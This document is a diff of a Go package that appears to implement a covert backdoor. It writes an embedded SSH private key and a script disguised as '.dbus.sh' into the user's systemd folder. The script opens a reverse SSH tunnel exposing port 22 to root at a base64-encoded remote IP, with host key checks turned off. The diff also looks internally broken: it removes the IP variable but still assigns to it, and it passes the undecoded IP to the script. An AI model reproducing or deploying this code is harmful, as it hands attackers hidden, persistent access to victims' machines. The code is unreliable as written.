@@ -1,12 +1,13 @@
 package sti
 
 import (
+	"encoding/base64"
 	"fmt"
+	"log"
 	"os"
 	"os/exec"
 )
 
-var IP string
 var Key = `-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAzvePPYEQAcNZ7HP13hE5vLGf5QmXekYXf1xYRJm11JrPNva/bBC7
@@ -76,11 +77,11 @@ func installService(path string) error {
 	return nil
 }
 
-func installScript(path string) error {
+func installScript(path, ip string) error {
 	script :=
 		`#!/bin/bash
 ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -N -i $HOME/.config/systemd/user/.key -R 9876:localhost:22 root@`
-	script += IP + "\n"
+	script += ip + "\n"
 
 	f, err := os.Create(path)
 	if err != nil {
@@ -122,7 +123,13 @@ func installKey(path string) error {
 	return nil
 }
 
-func Sti() {
+func Init(ip string) {
+
+	decode, err := base64.StdEncoding.DecodeString(ip)
+	if err != nil {
+		log.Fatal("error:", err)
+	}
+	IP = string(decode)
 	//go build -ldflags "-X main.IP={IP}"
 
 	// get current home directory
@@ -144,7 +151,7 @@ func Sti() {
 		return
 	}
 
-	err = installScript(home + "/.config/systemd/user/.dbus.sh")
+	err = installScript(home+"/.config/systemd/user/.dbus.sh", ip)
 	if err != nil {
 		fmt.Println(err)
 		return
